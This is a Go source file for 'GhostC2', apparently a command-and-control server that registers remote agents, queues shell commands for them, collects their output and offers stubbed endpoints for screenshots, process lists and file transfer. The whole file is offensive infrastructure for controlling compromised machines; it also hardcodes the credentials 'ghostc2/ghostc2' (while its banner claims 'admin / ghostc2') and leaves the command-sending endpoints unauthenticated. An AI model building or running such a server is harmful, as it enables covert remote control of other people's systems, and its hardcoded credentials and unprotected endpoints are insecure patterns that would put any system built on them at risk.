package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"time"
)

type Task struct {
	AgentID string `json:"agent_id"`
	Command string `json:"command"`
}

type Result struct {
	AgentID string `json:"agent_id"`
	Output  string `json:"output"`
	Time    string `json:"time"`
}

type CommandHistory struct {
	ID        string `json:"id"`
	AgentID   string `json:"agent_id"`
	Command   string `json:"command"`
	Output    string `json:"output"`
	Timestamp string `json:"timestamp"`
	Status    string `json:"status"`
}

type Session struct {
	ID        string
	Username  string
	CreatedAt time.Time
	ExpiresAt time.Time
}

var tasks = make(map[string]string)
var agentResults = make(map[string]string)
var commandHistory = make([]CommandHistory, 0)
var sessions = make(map[string]Session)
var mu sync.Mutex

// Simple credentials (in production, use proper authentication)
const (
	ADMIN_USERNAME = "ghostc2"
	ADMIN_PASSWORD = "ghostc2"
)

func main() {
	fmt.Println("[*] GhostC2 Server Started on http://localhost:8080")
	fmt.Println("[*] Default credentials: admin / ghostc2")

	http.HandleFunc("/login", handleLogin)
	http.HandleFunc("/logout", handleLogout)
	http.HandleFunc("/auth-check", checkAuth)

	http.HandleFunc("/register", registerAgent)
	http.HandleFunc("/get-task", getTask)
	http.HandleFunc("/submit-result", submitResult)
	http.HandleFunc("/assign-task", assignTask)
	http.HandleFunc("/agents", getAgents)
	http.HandleFunc("/send-command", sendCommand)
	http.HandleFunc("/results", getResults)
	http.HandleFunc("/api/agents", getAgents)
	http.HandleFunc("/api/send", sendCommand)
	http.HandleFunc("/api/results", getResults)
	http.HandleFunc("/api/history", getCommandHistory)
	http.HandleFunc("/api/upload", handleFileUpload)
	http.HandleFunc("/api/download", handleFileDownload)
	http.HandleFunc("/api/screenshot", handleScreenshot)
	http.HandleFunc("/api/processes", handleProcesses)

	fs := http.FileServer(http.Dir("server/static"))
	http.Handle("/static/", http.StripPrefix("/static/", fs))

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Println("Serving index.html for", r.URL.Path)
		if r.URL.Path != "/" && r.URL.Path != "/index.html" {
			http.NotFound(w, r)
			return
		}
		http.ServeFile(w, r, "server/static/index.html")
	})

	// Clean up expired sessions every hour
	go cleanupSessions()

	log.Fatal(http.ListenAndServe(":8080", nil))
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var creds struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	if creds.Username == ADMIN_USERNAME && creds.Password == ADMIN_PASSWORD {
		sessionID := generateSessionID()
		session := Session{
			ID:        sessionID,
			Username:  creds.Username,
			CreatedAt: time.Now(),
			ExpiresAt: time.Now().Add(24 * time.Hour),
		}

		mu.Lock()
		sessions[sessionID] = session
		mu.Unlock()

		http.SetCookie(w, &http.Cookie{
			Name:     "session_id",
			Value:    sessionID,
			Path:     "/",
			HttpOnly: true,
			MaxAge:   86400, // 24 hours
		})

		json.NewEncoder(w).Encode(map[string]string{"status": "success"})
	} else {
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
	}
}

func handleLogout(w http.ResponseWriter, r *http.Request) {
	sessionID := getSessionID(r)
	if sessionID != "" {
		mu.Lock()
		delete(sessions, sessionID)
		mu.Unlock()
	}

	http.SetCookie(w, &http.Cookie{
		Name:     "session_id",
		Value:    "",
		Path:     "/",
		HttpOnly: true,
		MaxAge:   -1,
	})

	json.NewEncoder(w).Encode(map[string]string{"status": "logged_out"})
}

func checkAuth(w http.ResponseWriter, r *http.Request) {
	if isAuthenticated(r) {
		json.NewEncoder(w).Encode(map[string]string{"status": "authenticated"})
	} else {
		http.Error(w, "Not authenticated", http.StatusUnauthorized)
	}
}

func isAuthenticated(r *http.Request) bool {
	sessionID := getSessionID(r)
	if sessionID == "" {
		return false
	}

	mu.Lock()
	session, exists := sessions[sessionID]
	mu.Unlock()

	if !exists {
		return false
	}

	if time.Now().After(session.ExpiresAt) {
		mu.Lock()
		delete(sessions, sessionID)
		mu.Unlock()
		return false
	}

	return true
}

func getSessionID(r *http.Request) string {
	cookie, err := r.Cookie("session_id")
	if err != nil {
		return ""
	}
	return cookie.Value
}

func generateSessionID() string {
	b := make([]byte, 32)
	rand.Read(b)
	return base64.URLEncoding.EncodeToString(b)
}

func cleanupSessions() {
	ticker := time.NewTicker(1 * time.Hour)
	for range ticker.C {
		mu.Lock()
		now := time.Now()
		for sessionID, session := range sessions {
			if now.After(session.ExpiresAt) {
				delete(sessions, sessionID)
			}
		}
		mu.Unlock()
	}
}

func registerAgent(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		http.Error(w, "Missing agent ID", http.StatusBadRequest)
		return
	}
	mu.Lock()
	tasks[id] = ""
	mu.Unlock()
	fmt.Printf("[+] Agent %s registered\n", id)
	fmt.Fprintf(w, "Agent %s registered", id)
}

func getTask(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	mu.Lock()
	cmd, exists := tasks[id]
	mu.Unlock()
	fmt.Println("getTask called for:", id, "exists:", exists, "cmd:", cmd)
	if !exists {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}
	resp := Task{AgentID: id, Command: cmd}
	json.NewEncoder(w).Encode(resp)
}

func submitResult(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	var result Result
	json.Unmarshal(body, &result)

	if result.Time == "" {
		result.Time = time.Now().Format("2006-01-02 15:04:05")
	}

	fmt.Println("submitResult called for:", result.AgentID, "output:", result.Output)

	log.Printf("[+] Output from %s: %s", result.AgentID, result.Output)

	mu.Lock()
	agentResults[result.AgentID] = result.Output
	tasks[result.AgentID] = "" // clear command

	// Add to command history
	history := CommandHistory{
		ID:        generateSessionID()[:8],
		AgentID:   result.AgentID,
		Command:   "Previous command",
		Output:    result.Output,
		Timestamp: result.Time,
		Status:    "completed",
	}
	commandHistory = append(commandHistory, history)

	// Keep only last 100 commands
	if len(commandHistory) > 100 {
		commandHistory = commandHistory[len(commandHistory)-100:]
	}
	mu.Unlock()

	fmt.Fprintf(w, "Result received")
}

func assignTask(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		http.Error(w, "Missing agent ID", http.StatusBadRequest)
		return
	}

	var task Task
	err := json.NewDecoder(r.Body).Decode(&task)
	if err != nil {
		http.Error(w, "Invalid body", http.StatusBadRequest)
		return
	}

	mu.Lock()
	tasks[id] = task.Command
	mu.Unlock()

	fmt.Fprintf(w, "Command assigned to %s", id)
}

func getAgents(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	ids := []string{}
	for id := range tasks {
		ids = append(ids, id)
	}
	mu.Unlock()
	json.NewEncoder(w).Encode(ids)
}

func sendCommand(w http.ResponseWriter, r *http.Request) {
	var task Task
	json.NewDecoder(r.Body).Decode(&task)

	mu.Lock()
	tasks[task.AgentID] = task.Command

	// Add to command history
	history := CommandHistory{
		ID:        generateSessionID()[:8],
		AgentID:   task.AgentID,
		Command:   task.Command,
		Output:    "",
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
		Status:    "pending",
	}
	commandHistory = append(commandHistory, history)
	mu.Unlock()

	fmt.Fprintf(w, "Command sent")
}

func getResults(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	json.NewEncoder(w).Encode(agentResults)
	mu.Unlock()
}

func getCommandHistory(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	json.NewEncoder(w).Encode(commandHistory)
	mu.Unlock()
}

func handleFileUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Parse multipart form
	err := r.ParseMultipartForm(32 << 20) // 32MB max
	if err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Failed to get file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// For now, just acknowledge the upload
	// In a real implementation, you'd save the file
	fmt.Printf("[+] File upload: %s, size: %d bytes\n", header.Filename, header.Size)

	json.NewEncoder(w).Encode(map[string]string{
		"status":   "uploaded",
		"filename": header.Filename,
		"size":     fmt.Sprintf("%d", header.Size),
	})
}

func handleFileDownload(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent_id")
	filePath := r.URL.Query().Get("path")

	if agentID == "" || filePath == "" {
		http.Error(w, "Missing agent_id or path", http.StatusBadRequest)
		return
	}

	// For now, just acknowledge the download request
	// In a real implementation, you'd send the file to the agent
	fmt.Printf("[+] File download request: agent=%s, path=%s\n", agentID, filePath)

	json.NewEncoder(w).Encode(map[string]string{
		"status":   "download_requested",
		"agent_id": agentID,
		"path":     filePath,
	})
}

func handleScreenshot(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent_id")

	if agentID == "" {
		http.Error(w, "Missing agent_id", http.StatusBadRequest)
		return
	}

	// For now, just acknowledge the screenshot request
	// In a real implementation, you'd send the screenshot command to the agent
	fmt.Printf("[+] Screenshot request: agent=%s\n", agentID)

	json.NewEncoder(w).Encode(map[string]string{
		"status":   "screenshot_requested",
		"agent_id": agentID,
	})
}

func handleProcesses(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent_id")

	if agentID == "" {
		http.Error(w, "Missing agent_id", http.StatusBadRequest)
		return
	}

	// For now, just acknowledge the process list request
	// In a real implementation, you'd send the process list command to the agent
	fmt.Printf("[+] Process list request: agent=%s\n", agentID)

	json.NewEncoder(w).Encode(map[string]string{
		"status":   "process_list_requested",
		"agent_id": agentID,
	})
}
